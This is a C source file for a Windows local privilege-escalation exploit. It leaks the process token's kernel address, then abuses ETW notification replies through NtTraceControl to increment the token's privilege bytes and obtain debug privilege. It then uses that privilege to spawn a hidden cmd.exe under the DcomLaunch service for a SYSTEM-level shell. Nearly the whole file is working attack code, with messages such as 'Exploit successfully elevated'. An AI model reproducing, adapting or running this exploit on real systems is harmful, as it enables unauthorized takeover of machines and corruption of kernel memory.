#include <Windows.h>
#include <guiddef.h>
#include <evntprov.h>
#include <initguid.h>
#include <conio.h>
#include <stdio.h>
#include <winternl.h>
#include <winnt.h>
#include "../Utils//Header.h"

HRESULT
GetTokenObjectIndex(
    _Out_ PULONG TokenIndex
)
{
    HANDLE hToken;
    BOOL bRes;
    NTSTATUS status;
    struct
    {
        OBJECT_TYPE_INFORMATION TypeInfo;
        WCHAR TypeNameBuffer[sizeof("Token")];
    } typeInfoWithName;

    //
    // Open the current process token
    //
    bRes = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
    if (bRes == FALSE)
    {
        return HRESULT_FROM_WIN32(GetLastError());
    }

    //
    // Get the object type information for the token handle
    //
    status = NtQueryObject(hToken,
        ObjectTypeInformation,
        &typeInfoWithName,
        sizeof(typeInfoWithName),
        NULL);
    CloseHandle(hToken);
    if (!NT_SUCCESS(status))
    {
        return HRESULT_FROM_NT(status);
    }

    //
    // Return the object type index
    //
    *TokenIndex = typeInfoWithName.TypeInfo.TypeIndex;
    return ERROR_SUCCESS;
}

HRESULT
GetProcessTokenAddress(
    _In_ HANDLE tokenHandle,
    _Out_ PVOID* HandleAddress
)
{
    NTSTATUS status;

    SYSTEM_HANDLE_INFORMATION localInfo;
    PSYSTEM_HANDLE_INFORMATION handleInfo = &localInfo;

    ULONG bytes;
    ULONG tokenIndex;
    ULONG i;
    HRESULT hResult;

    *HandleAddress = 0;
    //
    // Get the Object Type Index for Token Objects so we can recognize them
    //
    hResult = GetTokenObjectIndex(&tokenIndex);
    if (FAILED(hResult))
    {
        printf("Failed to get token\n");
        goto Failure;
    }

    //
    // Check how nig the handle table is
    //
    status = NtQuerySystemInformation(SystemHandleInformation,
                                      handleInfo,
                                      sizeof(*handleInfo),
                                      &bytes);
    if (NT_SUCCESS(status))
    {
        printf("NtQuerySystemInformation failed: 0x%x\n", status);
        hResult = ERROR_UNIDENTIFIED_ERROR;
        goto Failure;
    }

    //
    // Add space for 100 more handles and try again
    //
    bytes += 100 * sizeof(*handleInfo);
    handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
                                                       HEAP_ZERO_MEMORY,
                                                       bytes);
    status = NtQuerySystemInformation(SystemHandleInformation,
                                      handleInfo,
                                      bytes,
                                      &bytes);
    if (!NT_SUCCESS(status) || !handleInfo)
    {
        hResult = HRESULT_FROM_NT(status);
        printf("NtQuerySystemInformation #2 failed: 0x%x\n", status);
        goto Failure;
    }

    //
    // Enumerate each one
    //
    for (i = 0; i < handleInfo->NumberOfHandles; i++)
    {
        //
        // Check if it's the token of this process
        //
        if ((handleInfo->Handles[i].ObjectTypeIndex == tokenIndex) &&
            (handleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId()) &&
            ((HANDLE)handleInfo->Handles[i].HandleValue == tokenHandle))
        {
            printf("Found current process token\n");
            *HandleAddress = handleInfo->Handles[i].Object;
        }
    }

Failure:
    //
    // Free the handle list if we had one
    //
    if (handleInfo != &localInfo)
    {
        HeapFree(GetProcessHeap(), 0, handleInfo);
    }
    return hResult;
}

HRESULT
GetServiceHandle(
    _In_ LPCWSTR ServiceName,
    _Out_ PHANDLE ProcessHandle
)
{
    SC_HANDLE hScm, hRpc;
    BOOL bRes;
    SERVICE_STATUS_PROCESS procInfo;
    HRESULT hResult;
    DWORD dwBytes;
    HANDLE hProc;

    //
    // Prepare for cleanup
    //
    hScm = NULL;
    hRpc = NULL;

    //
    // Connect to the SCM
    //
    hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hScm == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        printf("OpenScManager failed with error %d\n", hResult);
        goto Failure;
    }

    //
    // Open the service
    //
    hRpc = OpenService(hScm, ServiceName, SERVICE_QUERY_STATUS);
    if (hRpc == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        printf("OpenService failed with error %d\n", hResult);
        goto Failure;
    }

    //
    // Query the process information
    //
    bRes = QueryServiceStatusEx(hRpc,
                                SC_STATUS_PROCESS_INFO,
                                (LPBYTE)&procInfo,
                                sizeof(procInfo),
                                &dwBytes);
    if (bRes == FALSE)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        printf("QueryServiceStatusEx failed with error %d\n", hResult);
        goto Failure;
    }

    //
    // Open a handle for all access to the PID
    //
    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
    if (hProc == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        printf("OpenProcess failed with error %d\n", hResult);
        goto Failure;
    }

    //
    // Return the PID
    //
    *ProcessHandle = hProc;
    hResult = ERROR_SUCCESS;

Failure:
    //
    // Cleanup the handles
    //
    if (hRpc != NULL)
    {
        CloseServiceHandle(hRpc);
    }
    if (hScm != NULL)
    {
        CloseServiceHandle(hScm);
    }
    return hResult;
}

ULONG
EtwNotificationCallback(
    ETW_NOTIFICATION_HEADER* NotificationHeader,
    PVOID Context
)
{
    return 1;
}

int main()
{
    ETWP_NOTIFICATION_HEADER dataBlock;
    ETWP_NOTIFICATION_HEADER outputBuffer;
    ULONG returnLength = 0;
    NTSTATUS status;
    REGHANDLE regHandle;
    PVOID tokenAddress;
    HRESULT result;
    PVOID presentPrivilegesAddress;
    PVOID enabledPrivilegesAddress;
    HANDLE processTokenHandle;
    BOOL bRes;
    HANDLE parentHandle;
    PPROC_THREAD_ATTRIBUTE_LIST procList;
    STARTUPINFOEX startupInfoEx;
    PROCESS_INFORMATION processInfo;
    SIZE_T listSize;

    //
    // Open handle to process token
    //
    bRes = OpenProcessToken(GetCurrentProcess(),
                            TOKEN_ALL_ACCESS,
                            &processTokenHandle);
    if (bRes == FALSE)
    {
        printf("OpenProcessToken failed\n");
        return 0;
    }

    //
    // Get the address of the process token
    //
    result = GetProcessTokenAddress(processTokenHandle, &tokenAddress);
    printf("Process token address: 0x%p\n", tokenAddress);
    CloseHandle(processTokenHandle);

    //
    // We want to set privileges for the process so we calculate the address of Token.Privileges
    // SE_DEBUG_PRIVILEGE is 0x100000 but we can only create up to 0x7f0 providers.
    // So instead we will shift the addresses that we want to increment by 2 bytes
    // and then we only need to increment by 0x10 (since we are incrementing the third byte directly)
    //
    presentPrivilegesAddress = (PVOID)((ULONG64)tokenAddress +
        offsetof(TOKEN, Privileges.Present) + 2);
    enabledPrivilegesAddress = (PVOID)((ULONG64)tokenAddress +
        offsetof(TOKEN, Privileges.Enabled) + 2);
    printf("Editing addresses: 0x%p, 0x%p\n",
        presentPrivilegesAddress,
        enabledPrivilegesAddress);

    RtlZeroMemory(&dataBlock, sizeof(dataBlock));

    printf("Editing privileges...\n");
    //
    // Create 0x10 providers
    //
    for (int i = 0; i < 0x10; i++)
    {
        result = EtwNotificationRegister(&EXPLOIT_GUID,
                                         EtwNotificationTypeCredentialUI,
                                         EtwNotificationCallback,
                                         NULL,
                                         &regHandle);
        if (!SUCCEEDED(result))
        {
            printf("Failed registering new provider\n");
            return 0;
        }
    }
    //
    // Queue the first request that will increment our present privileges
    //
    dataBlock.NotificationType = EtwNotificationTypeCredentialUI;
    //
    // Has to be anything other than 0 and 1
    //
    dataBlock.ReplyRequested = 2;
    dataBlock.NotificationSize = sizeof(dataBlock);
    //
    // The byte at ReplyObject - 0x30 will be incremented
    //
    dataBlock.ReplyObject = (void*)((ULONG64)(presentPrivilegesAddress)+
        offsetof(OBJECT_HEADER, Body));
    dataBlock.DestinationGuid = EXPLOIT_GUID;
    status = NtTraceControl(EtwSendDataBlock,
                            &dataBlock,
                            sizeof(dataBlock),
                            &outputBuffer,
                            sizeof(outputBuffer),
                            &returnLength);

    //
    // Queue a second request to increment our enabled privileges
    //
    dataBlock.NotificationType = EtwNotificationTypeCredentialUI;
    //
    // Has to be anything other than 0 and 1
    //
    dataBlock.ReplyRequested = 2;
    dataBlock.NotificationSize = sizeof(dataBlock);
    //
    // The byte at ReplyObject - 0x30 will be incremented
    //
    dataBlock.ReplyObject = (void*)((ULONG64)(enabledPrivilegesAddress)+
        offsetof(OBJECT_HEADER, Body));
    dataBlock.DestinationGuid = EXPLOIT_GUID;
    status = NtTraceControl(EtwSendDataBlock,
                            &dataBlock,
                            sizeof(dataBlock),
                            &outputBuffer,
                            sizeof(outputBuffer),
                            &returnLength);
    printf("Done editing privileges\n");
    //
    // Now queue 2 harmless messages just to take up the rest of the slots
    //
    for (int i = 0; i < 2; i++)
    {
        dataBlock.NotificationType = EtwNotificationTypeCredentialUI;
        dataBlock.ReplyRequested = 1;
        dataBlock.NotificationSize = sizeof(dataBlock);
        dataBlock.DestinationGuid = EXPLOIT_GUID;
        status = NtTraceControl(EtwSendDataBlock,
                                &dataBlock,
                                sizeof(dataBlock),
                                &outputBuffer,
                                sizeof(outputBuffer),
                                &returnLength);
        if (!NT_SUCCESS(status))
        {
            printf("Failed incrementing arbitrary location\n");
            goto Exit;
        }
    }
    printf("Exploit successfully elevated to receive debug privileges\n");

    //
    // Open a handle to DCOM Launch
    //
    result = GetServiceHandle(L"DcomLaunch", &parentHandle);
    if (FAILED(result))
    {
        printf("Failed to get handle to DcomLaunch service\n");
        goto Exit;
    }
    printf("Received handle to DcomLaunch\n");

    //
    // Create a new process with DcomLaunch as a parent
    //
    procList = NULL;
    //
    // Figure out the size we need for one attribute (this should always fail)
    //
    bRes = InitializeProcThreadAttributeList(NULL, 1, 0, &listSize);
    if (bRes != FALSE)
    {
        printf("InitializeProcThreadAttributeList succeeded when it should have failed\n");
        goto Exit;
    }

    //
    // Then allocate it
    //
    procList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
                                                      HEAP_ZERO_MEMORY,
                                                      listSize);
    if (procList == NULL)
    {
        printf("Failed to allocate memory\n");
        goto Exit;
    }
    //
    // Re-initialize the list again
    //
    bRes = InitializeProcThreadAttributeList(procList, 1, 0, &listSize);
    if (bRes == FALSE)
    {
        printf("Failed to initialize procThreadAttributeList\n");
        goto Exit;
    }
    //
    // Now set the DcomLaunch process as the parent
    //
    bRes = UpdateProcThreadAttribute(procList,
                                     0,
                                     PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                     &parentHandle,
                                     sizeof(parentHandle),
                                     NULL,
                                     NULL);
    if (bRes == FALSE)
    {
        printf("Failed to update ProcThreadAttribute");
        goto Exit;
    }
    //
    // Initialize the startup info structure to say that we want to:
    //
    //  1) Hide the window
    //  2) Use the socket as standard in/out/error
    //  3) Use an attribute list
    //
    // Then, spawn the process, again making sure there's no window, and
    // indicating that we have extended attributes.
    //
    RtlZeroMemory(&startupInfoEx, sizeof(startupInfoEx));
    startupInfoEx.StartupInfo.cb = sizeof(startupInfoEx);
    startupInfoEx.StartupInfo.wShowWindow = SW_HIDE;
    startupInfoEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW |
        STARTF_USESTDHANDLES;
    startupInfoEx.lpAttributeList = procList;
    bRes = CreateProcess(L"c:\\windows\\system32\\cmd.exe",
                         NULL,
                         NULL,
                         NULL,
                         TRUE,
                         CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
                         NULL,
                         NULL,
                         &startupInfoEx.StartupInfo,
                         &processInfo);
    if (bRes == FALSE)
    {
        printf("CreateProcess failed\n");
        goto Exit;
    }
    printf("Created new process with ID %d\n", processInfo.dwProcessId);
    //
    // We never care about the main thread
    //
    CloseHandle(processInfo.hThread);

    //
    // Close the handle to the new process when we're done with it
    //
    CloseHandle(processInfo.hProcess);
Exit:
    //
    // Wait here because our process can't exit without crashing the machine
    //
    _getch();
}